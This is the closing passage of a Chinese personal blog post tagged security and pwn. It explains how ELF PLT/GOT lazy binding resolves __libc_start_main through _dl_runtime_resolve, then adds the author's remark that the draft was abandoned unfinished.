</span></code></pre><p><code>jmp *0x804a024</code>，<code>0x804a024</code>是 GOT 上 <code>__libc_start_main</code> 的地址，在第一次调用前，这个地址上填充的值实际是 <code>0x8048496</code>，也就是 <code>__libc_start_main@plt</code> 第二条指令 <code>push $0x30</code> 的地址。<p>而后的 <code>push</code>和 <code>jmp</code> 最终会调用 <code>_dl_runtime_resolve</code> 函数（<code>.got.plt</code>第三项）完成解析，填充 GOT 并返回。<p>这玩意儿和 PE 文件的 IAT 性质是一样的，只是PE少一步延迟链接。<p>综上所述随便拿一个GOT表项的值是不行的，因为里面的地址可能是 PLT 的地址而不是真实 libc 函数的地址。<h2 id=lan-wei-zong-jie>烂尾总结</h2><p>续于 2022年12月31日。<p>整理草稿箱的时候发现了这篇写了一半的博客。这篇应该是在六七月开始写的，写了大半，结果工作一忙，完全忘了。这会儿思路也续不上，干脆就弃坑了。<p>就这样吧，叹口气，但不管怎么着生活还得继续。</article><p class=tags-data><a href=/tags/security>/security/</a> <a href=/tags/pwn>/pwn/</a></p><script data-repo-id="MDEwOlJlcG9zaXRvcnkzOTg0ODYyMTg=" async crossorigin data-category=Announcements data-category-id=DIC_kwDOF8Bqys4Cegmn data-emit-metadata=0 data-input-position=bottom data-lang=zh-CN data-mapping=pathname data-reactions-enabled=1 data-repo=nnnewb/nnnewb.github.io data-strict=0 data-theme=noborder_light id=giscus_script src=https://giscus.app/client.js></script></main><footer><hr><div id=footer-container><div><p style=text-align:center>Copyright © 2018-2024 weakptr <a href=mailto:weak_ptr@outlook.com>&lt;weak_ptr@outlook.com></a><p style=text-align:center>Built with <a rel="noopener noreferrer" href=https://www.getzola.org target=_blank>Zola</a> using <a rel="noopener noreferrer" href=https://github.com/Speyll/anemone target=_blank>anemone</a> theme, <a rel="noopener noreferrer" href=https://speyll.github.io/suCSS/ target=_blank>suCSS</a> framework & <a rel="noopener noreferrer" href=https://github.com/Speyll/veqev target=_blank>veqev</a>, modified by <a rel="noopener noreferrer" href=https://github.com/nnnewb/ target=_blank>nnnewb</a>.<p style=text-align:center>Theme and color theme licensed under <a rel="noopener noreferrer" href=https://en.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a>.</div></div></footer>